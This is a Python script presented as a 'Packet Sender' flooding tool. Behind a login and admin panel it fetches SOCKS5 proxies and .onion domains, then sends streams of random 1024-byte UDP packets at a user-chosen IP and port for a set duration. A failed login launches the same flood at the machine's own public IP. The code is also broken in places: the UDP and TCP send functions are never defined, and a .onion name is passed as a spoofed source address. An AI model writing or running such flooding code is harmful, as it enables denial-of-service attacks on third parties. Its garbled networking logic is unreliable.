import random
import time
import socks
import socket
import requests
from scapy.all import IP, UDP, Raw, send
from stem import Signal
from stem.control import Controller
import hashlib
import os
import json

# ANSI escape codes for coloring text
def rgb_color(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"

# Function to reset color back to normal
def reset_color():
    return "\033[0m"

# Fetch proxies from an external source
def fetch_proxies():
    """Fetch a list of SOCKS5 proxies and save them to a file."""
    try:
        url = "https://www.proxy-list.download/api/v1/get?type=socks5"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            proxies = response.text.split("\r\n")
            with open('proxies.txt', 'w') as f:
                for proxy in proxies:
                    f.write(f"{proxy}\n")
            print(f"{rgb_color(0, 255, 0)}Proxies fetched and saved successfully.{reset_color()}")
            return proxies[:100]  # Fetch up to 100 proxies
        else:
            print(f"{rgb_color(255, 0, 0)}Error fetching proxies.{reset_color()}")
            return []
    except Exception as e:
        print(f"{rgb_color(255, 0, 0)}Error fetching proxies: {e}{reset_color()}")
        return []

# Fetch .onion domains from an external source
def fetch_onion_domains():
    """Fetch random .onion domains and save them to a file."""
    try:
        url = "http://onion.ws/api/v1/search/?q=site:.onion&limit=100"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            onion_domains = [domain['domain'] for domain in response.json()['results']]
            with open('onion_domains.txt', 'w') as f:
                for domain in onion_domains:
                    f.write(f"{domain}\n")
            print(f"{rgb_color(0, 255, 0)}.onion domains fetched and saved successfully.{reset_color()}")
            return onion_domains
        else:
            print(f"{rgb_color(255, 0, 0)}Error fetching .onion domains.{reset_color()}")
            return []
    except Exception as e:
        print(f"{rgb_color(255, 0, 0)}Error fetching .onion domains: {e}{reset_color()}")
        return []

# Fetch DNS IPs from a predefined list and save them to a file
def fetch_dns_ips():
    """Fetch a list of DNS IPs and save them to a file."""
    dns_ips = [
        "8.8.8.8", "8.8.4.4",  # Google DNS
        "1.1.1.1", "1.0.0.1",  # Cloudflare DNS
        "9.9.9.9",             # Quad9 DNS
        "208.67.222.222", "208.67.220.220",  # OpenDNS
        "64.6.64.6", "64.6.65.6",  # Verisign DNS
        "77.88.8.8", "77.88.8.1",  # Yandex DNS
        "185.228.168.9", "185.228.169.9",  # CleanBrowsing DNS
        "76.76.19.19", "76.76.20.20",  # Comodo DNS
    ]
    with open('dns_ips.txt', 'w') as f:
        for ip in dns_ips:
            f.write(f"{ip}\n")
    print(f"{rgb_color(0, 255, 0)}DNS IPs saved successfully.{reset_color()}")
    return dns_ips

# MD5 hash a string (password or username)
def md5_hash(input_string):
    """Return the MD5 hash of the input string."""
    return hashlib.md5(input_string.encode()).hexdigest()

# Load users from user.txt
def load_users():
    """Load users from the user.txt file into a dictionary."""
    users = {}
    if os.path.exists('user.txt'):
        with open('user.txt', 'r') as file:
            for line in file:
                username, password_hash = line.strip().split(',')
                users[username] = password_hash
    return users

# Save users to user.txt
def save_users(users):
    """Save users and their hashed passwords to user.txt."""
    with open('user.txt', 'w') as file:
        for username, password_hash in users.items():
            file.write(f"{username},{password_hash}\n")

# Function to verify user login
def login():
    """Prompt the user for login."""
    users_db = load_users()
    username = input("Enter username: ")
    password = input("Enter password: ")

    # Check if the user exists and if the password matches
    if username in users_db and users_db[username] == md5_hash(password):
        print(f"{rgb_color(0, 255, 0)}Login successful!{reset_color()}")
        return True
    else:
        print(f"{rgb_color(255, 0, 0)}Invalid username or password.{reset_color()}")
        handle_failed_login(username)
        return False

# Handle failed login: Fetch user IP and run Tordle method
def handle_failed_login(username):
    """Fetch the user IP and initiate a Tordle attack."""
    print(f"{rgb_color(255, 100, 0)}Login failed for user: {username}. Initiating Tordle...{reset_color()}")

    # Fetch the IP address of the user from an external service
    try:
        user_ip = requests.get('https://api.ipify.org?format=json').json()['ip']
        print(f"{rgb_color(255, 0, 0)}Fetched User IP: {user_ip}{reset_color()}")
    except Exception as e:
        print(f"{rgb_color(255, 0, 0)}Error fetching user IP: {e}{reset_color()}")
        user_ip = '127.0.0.1'  # Fallback to local IP

    proxies = load_from_file('proxies.txt')
    onion_domains = load_from_file('onion_domains.txt')
    dns_ips = load_from_file('dns_ips.txt')

    # Call Tordle function
    send_tordle_packet(user_ip, 80, proxies, onion_domains, dns_ips)

# Load data from a file
def load_from_file(file_name):
    """Load contents of a file into a list."""
    with open(file_name, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Method to ensure Tor is connected
def ensure_tor_connection():
    """Ensure Tor is running and configured correctly."""
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()  # Make sure Tor is running and authenticated
            controller.signal(Signal.NEWNYM)  # Rotate Tor circuit
            print(f"{rgb_color(0, 255, 0)}Tor is running correctly!{reset_color()}")
    except Exception as e:
        print(f"{rgb_color(255, 0, 0)}Error connecting to Tor: {e}{reset_color()}")
        return False
    return True

# Method to send Tordle (Tor) packet
def send_tordle_packet(target_ip, target_port, proxies, onion_domains, dns_ips, duration=30):
    """Send packets through Tor using random proxies, .onion domains, and DNS IPs."""
    start_time = time.time()

    while time.time() - start_time < duration:
        # Select random proxy, onion domain, and DNS IP
        proxy = random.choice(proxies)
        onion_domain = random.choice(onion_domains)
        dns_ip = random.choice(dns_ips)

        print(f"{rgb_color(255, 255, 0)}Sending Tordle packet to {target_ip}:{target_port} via proxy {rgb_color(0, 255, 255)}{proxy}{reset_color()} | "
              f"{rgb_color(255, 100, 255)}.onion: {onion_domain}{reset_color()} | "
              f"{rgb_color(255, 100, 0)}DNS: {dns_ip}{reset_color()}")

        # Set proxy for SOCKS connection
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy, 1080)
        socket.socket = socks.socksocket

        # Ensure Tor connection is active
        if not ensure_tor_connection():
            print(f"{rgb_color(255, 0, 0)}Tor connection failed!{reset_color()}")
            return

        # Build and send the packet with random data and a randomly chosen .onion domain as source
        packet = IP(dst=target_ip, src=onion_domain) / UDP(dport=target_port) / Raw(load=random._urandom(1024))
        send(packet)
        time.sleep(0.1)

# Admin panel: Add, delete, ban users
def admin_panel():
    """Admin panel for user management."""
    print(f"{rgb_color(255, 100, 0)}Admin Panel{reset_color()}")
    print(f"{rgb_color(0, 255, 255)}1. Add User{reset_color()}")
    print(f"{rgb_color(0, 255, 255)}2. Delete User{reset_color()}")
    print(f"{rgb_color(0, 255, 255)}3. Ban User{reset_color()}")
    admin_choice = input("Select admin action: ")

    if admin_choice == "1":
        username = input("Enter username: ")
        password = input("Enter password: ")
        add_user(username, password)
    elif admin_choice == "2":
        username = input("Enter username to delete: ")
        delete_user(username)
    elif admin_choice == "3":
        ip = input("Enter IP to ban: ")
        ban_user(ip)

# Functions to handle user management (placeholders)
def add_user(username, password):
    """Add user to the system."""
    password_hash = md5_hash(password)
    users = load_users()
    users[username] = password_hash
    save_users(users)
    print(f"{rgb_color(0, 255, 0)}User {username} added successfully.{reset_color()}")

def delete_user(username):
    """Delete user from the system."""
    users = load_users()
    if username in users:
        del users[username]
        save_users(users)
        print(f"{rgb_color(0, 255, 0)}User {username} deleted successfully.{reset_color()}")
    else:
        print(f"{rgb_color(255, 0, 0)}User {username} does not exist.{reset_color()}")

def ban_user(ip):
    """Ban a user based on their IP address."""
    print(f"{rgb_color(255, 0, 0)}User with IP {ip} has been banned.{reset_color()}")

# Main function to run the program
def main():
    print(f"{rgb_color(255, 0, 255)}Welcome to the Packet Sender!{reset_color()}")
    
    # Fetch necessary data
    proxies = fetch_proxies()
    onion_domains = fetch_onion_domains()
    dns_ips = fetch_dns_ips()

    # Check login status
    if login():
        while True:
            print(f"\n{rgb_color(0, 255, 255)}1. Send UDP Packet{reset_color()}")
            print(f"{rgb_color(0, 255, 255)}2. Send TCP Packet{reset_color()}")
            print(f"{rgb_color(0, 255, 255)}3. Send Tordle Packet{reset_color()}")
            print(f"{rgb_color(0, 255, 255)}4. Admin Panel{reset_color()}")

            choice = input("Select an option: ")

            if choice == "1":
                target_ip = input("Enter target IP: ")
                target_port = int(input("Enter target port: "))
                duration = int(input("Enter duration in seconds: "))
                send_udp_packet(target_ip, target_port, duration)
            elif choice == "2":
                target_ip = input("Enter target IP: ")
                target_port = int(input("Enter target port: "))
                duration = int(input("Enter duration in seconds: "))
                send_tcp_packet(target_ip, target_port, duration)
            elif choice == "3":
                target_ip = input("Enter target IP: ")
                target_port = int(input("Enter target port: "))
                duration = int(input("Enter duration in seconds: "))
                send_tordle_packet(target_ip, target_port, proxies, onion_domains, dns_ips, duration)
            elif choice == "4":
                admin_panel()
            else:
                print(f"{rgb_color(255, 0, 0)}Invalid choice! Please try again.{reset_color()}")
    else:
        print(f"{rgb_color(255, 0, 0)}Login failed!{reset_color()}")

if __name__ == "__main__":
    main()
